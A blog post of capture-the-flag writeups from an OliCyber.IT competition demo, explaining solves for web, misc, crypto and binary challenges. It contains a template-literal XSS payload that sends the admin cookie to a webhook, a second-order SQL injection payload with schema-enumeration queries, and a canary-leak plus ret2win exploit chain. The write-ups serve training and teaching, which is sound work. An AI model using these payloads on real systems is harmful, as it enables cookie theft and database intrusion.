---
title: "OliCyber.IT Demo Writeups"
date: 2026-02-28T12:00:00+01:00
draft: false
summary: "A collection of writeups for web, misc, crypto, and binary CTF-style challenges."
tags: ["ctf", "writeup", "security"]
showTableOfContents: true
showAuthor: false
authors:
  - "matthew-olicyber"
---

This post collects the challenges I solved during the demo of the territorial selection for the OliCyber.IT program, a 4-hour CTF competition. The goal is to document the exploitation path for each solved challenge in clear English, with more focus on the core idea than on reproducing every step of the environment.

## Web

### È tempo di mettere tutto insieme

The whole point of this challenge was to combine multiple HTTP inputs at the same time.

The successful request used:

1. A query parameter: `?we_like=flags`
2. A custom header: `give-me: the-flag`
3. A cookie: `session_id=the_session`
4. A plain-text request body: `pretty please :(`
5. The `OPTIONS` method instead of the more common `GET` or `POST`

The solve script was:

```python
import requests

url = "http://10.45.1.2:4001/?we_like=flags"

headers = {
    "give-me": "the-flag",
    "Content-Type": "text/plain"
}

biscotto = {
    "session_id": "the_session"
}

corpo = "pretty please :("

r = requests.options(url, headers=headers, cookies=biscotto, data=corpo)
print(r.text)
```

Recovered flag:

```text
flag{puTt1Ng_t0g3tH3r_4Ll_hTtP_1npUtS_5faf6308}
```

### Un semplice blog

This challenge allowed users to create a post with a title and a body, and the obvious first idea was to look for a DOMPurify bypass. That path did not go anywhere: the version in use did not have any known CVE that helped here, so the right move was to stop hunting for a library bug and inspect how the application was actually calling `sanitize()`.

That is where the real issue was. The post content was passed to DOMPurify through backticks, which means the untrusted data first entered a JavaScript template literal. That is an unsafe pattern because template literals are not passive strings: `${...}` is evaluated as JavaScript while the string is being built. In other words, the dangerous part happened before DOMPurify ever received the input.

So the bug was not "DOMPurify is vulnerable", but "DOMPurify is used after code execution is already possible".

The payload used for the solve was:

```js
${fetch("webhook/?f="+document.cookie)}
```

Once that payload was inserted into the post body, the next step was to report the page to the admin. When the admin opened the post, the expression inside `${...}` executed in the browser, read `document.cookie`, and sent it to my webhook. Since the flag was stored in the admin cookie, that single request was enough to recover it.

### CarrQ

This challenge looked like a normal QR-based card lookup, but the interesting part was in the backend flow: the vulnerable input was used in one query, and the result of that query was then interpolated into a second one. In practice, this was a second-order SQL injection hidden behind a CSRF-protected form.

The important PHP logic was:

```php
$query1 = "SELECT user_id FROM cards WHERE card_id = '$card_id'";
$user = query($query1)[0]['user_id'];

$query2 = "SELECT * FROM users WHERE id = '$user'";
$res = query($query2)[0];
```

That detail matters because the page does not render the result of the first query directly. `card_id` only controls the lookup in `cards`, and that lookup returns a `user_id`. The vulnerable design choice is that the application then treats that database value as trusted data and interpolates it into a second SQL query.

That is what makes this challenge more interesting than a plain SQL injection. The attacker-controlled input enters the application through `card_id`, but the dangerous effect appears only later, when the result of the first query is reused inside the second one. In other words, the sink is separated from the original input point by an intermediate database read.

CSRF protection was present, but it only constrained how requests had to be sent. It did not address the real problem, which was the unsafe string interpolation in both queries. In practice, the solver first had to fetch the page, extract the token from the hidden field, keep the same session cookies, and only then submit the malicious `card_id` value.

The payload looked unusual because it was doing two different jobs at once:

```text
' UNION SELECT 'xxx'' UNION SELECT 1 AS id, ({sql_query}) AS username, 3 AS sub, 4 AS exp -- ' -- -
```

The first `UNION SELECT` belongs to `query1`, which only returns one column: `user_id`. That means the injected row must also have one column. That single returned value is not meant to be a real ID; it is a string that already contains the second-stage SQL fragment:

```text
xxx' UNION SELECT 1 AS id, ({sql_query}) AS username, 3 AS sub, 4 AS exp --
```

Once that string is assigned to `$user`, the second query becomes effectively:

```sql
SELECT * FROM users WHERE id = 'xxx'
UNION SELECT 1, (<attacker query>), 3, 4 -- '
```

At that point the injection has reached the query whose result is actually rendered in the page. The application prints `username`, `sub`, and `exp`, so the exploit places the interesting data in the second column, aliased as `username`. The other values are just fillers to match the four-column shape of `SELECT * FROM users`.

The output side also mattered. Because the page reflected fields from the second query directly into the response, it became possible to use the `username` slot as an exfiltration channel.

The injected queries first enumerated the SQLite tables:

```sql
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type="table"
```

then read the schema of the interesting table:

```sql
SELECT sql FROM sqlite_master WHERE type="table" AND tbl_name="flag"
```

and finally extracted the flag directly:

```sql
SELECT flag FROM flag LIMIT 1
```

From a defensive point of view, the fix is straightforward: use prepared statements for both queries and never build a new SQL statement by concatenating data that came either from the user or from a previous query result.

Recovered flag:

```text
flag{let_m3_1n!_058a91e6}
```

## Misc

### Unflipper equation

At first sight this challenge looked like a basic math exercise: the page showed an equation of the form

```text
ax + b = c
```

and the client only had to compute:

```text
x = (c - b) / a
```

The source code made it clear that the real bug was not in the math, but in the state handling. The application generated one equation on `/`, stored the rounded result in the session, and then `/solve` only checked that submitted value against the same session entry:

```python
equation, solution = generate_equation()
session["solution"] = round(solution, 2)
```

```python
@app.route("/solve", methods=["POST"])
def solve():
    json_data = request.get_json()
    solution = float(json_data["solution"])
    if solution == session.get("solution"):
        session["points"] = session.get("points", 0) + 1
    return jsonify({"correct": solution == session.get("solution")})
```

The vulnerable part is that a correct submission increments `session["points"]`, but does not invalidate `session["solution"]` and does not generate a new equation. Since a new challenge is only created when `/` is rendered again, one correct answer can be replayed as many times as needed.

So after parsing `a`, `b`, and `c` from the page, I computed `x = (c - b) / a`, rounded it exactly like the server, and replayed that same value to `/solve` until the score reached 100. Reloading `/` after that returned the flag.

Recovered flag:

```text
flag{did_y0u_d0_i7_7h3_cryp70_w4y?}
```

## Crypto

### yet another encryption

Despite the category, this challenge was really a permutation problem.

The encryption function split the flag into rows of 6 characters and then read characters with this rule:

```python
rows[j][(i + j) % len(rows[0])]
```

Since the ciphertext length is 36, the data forms a `6 x 6` square. To invert the process, the decryptor rebuilds the matrix by putting each ciphertext byte back into the cell that produced it, then flattens the rows.

Since the ciphertext length is a perfect square, the data fits a `6 x 6` square. From there the only real work is reversing the index mapping used by the encryptor, rebuilding the original rows, and joining them back together.

Recovered flag:

```text
flag{0nc3_4g41n_tr4nsposed_abc19b2e}
```

## Binary

### secret runpath

This binary practically gave away the solution with its message:

```text
Nothing to see here. Maybe you should inspect the dynamic sections of this ELF.
```

The trick was that the flag was hidden in ELF metadata rather than in executable code. Running `readelf -d` shows a fake `RUNPATH` entry containing a suspicious string:

```text
fl\x01ag\x01{t\x01ru\x01st...
```

The bytes `0x01` were inserted between chunks to stop a normal `strings` pass from printing a clean flag. Once those separators were removed, the hidden value became obvious.

The solve was just to inspect the dynamic section with `readelf -d`, notice the malformed `RUNPATH`, dump the underlying bytes from `.dynstr`, remove the `0x01` separators, and read the result.

Recovered flag:

```text
flag{trust_the_runtime_path_5dc3c56e}
```

### revme

This challenge applied a reversible byte transformation to the user input and compared the result with a static target buffer.

Disassembly shows the forward transform:

1. XOR every byte with `0x37`
2. Rotate each byte left by `index mod 8`
3. Add the byte index
4. Reverse the whole byte array

To solve it, I inverted those operations in reverse order. Because the final step is a byte-array reversal, iterating over the target bytes in reverse order is enough to undo that part implicitly.

So the solver simply walks the target bytes from the end to the beginning, subtracts the current index modulo 256, rotates right by `index mod 8`, XORs with `0x37`, and appends the recovered plaintext byte.

Recovered flag:

```text
flag{reverse_me_if_you_can_aa4307fa}
```

### secure admin panel

This was the most complete binary exploitation challenge in the set because it chained two bugs together.

The important thing to understand is that neither bug was enough on its own:

1. `set_name` let me corrupt program state, but not hijack control flow.
2. `leave_feedback` gave a stack overflow, but stack canaries prevented a direct ret2win.

The exploit worked because the first bug unlocked an information leak, and that leak made the second bug usable.

The first bug is in `set_name`. The function reads `0x30` bytes into a global area where a `name` buffer is followed immediately by the global integer `is_admin`. In practice, that means I can write past the end of `name` and overwrite the admin flag checked later by `admin_feature`.

The first-stage payload was:

```text
"A" * 32 + p32(0x41424344) + "B" * 12
```

The first 32 bytes fill `name`, the next 4 bytes overwrite `is_admin` with the magic value, and the remaining bytes just satisfy the oversized read. After that, the binary believes I am an admin.

Once that check passes, `admin_feature` becomes reachable and prints:

```text
Regalino: %p
```

That `%p` leak is the critical bridge between the two vulnerabilities: it discloses the stack canary value. Without that leak, the second bug is not very useful, because `leave_feedback` uses `gets` on a local stack buffer, but any attempt to smash the return address would trigger `__stack_chk_fail`.

Once the canary is known, the stack overflow becomes exploitable. The stack frame layout was effectively:

```text
[ buffer (0x18 bytes) ][ canary ][ saved rbp ][ return address ]
```

So the second-stage payload had to preserve the canary and only then overwrite the saved return address.

In practice, the exploit first triggers the global overflow in `set_name`, then calls `admin_feature` to leak the canary, and only afterwards sends the final payload to `leave_feedback`, preserving the canary and returning into `win()`.

The final ret2win payload was:

```text
padding(0x18) + canary + saved_rbp + ret + win
```

The `padding(0x18)` reaches the canary, the leaked canary is written back unchanged, then the saved base pointer is skipped, and finally execution is redirected to `win()`. The extra `ret` gadget is there only for stack alignment before entering `win()`. Since the binary is not PIE, the address of `win()` is fixed, so a simple ret2win is enough.
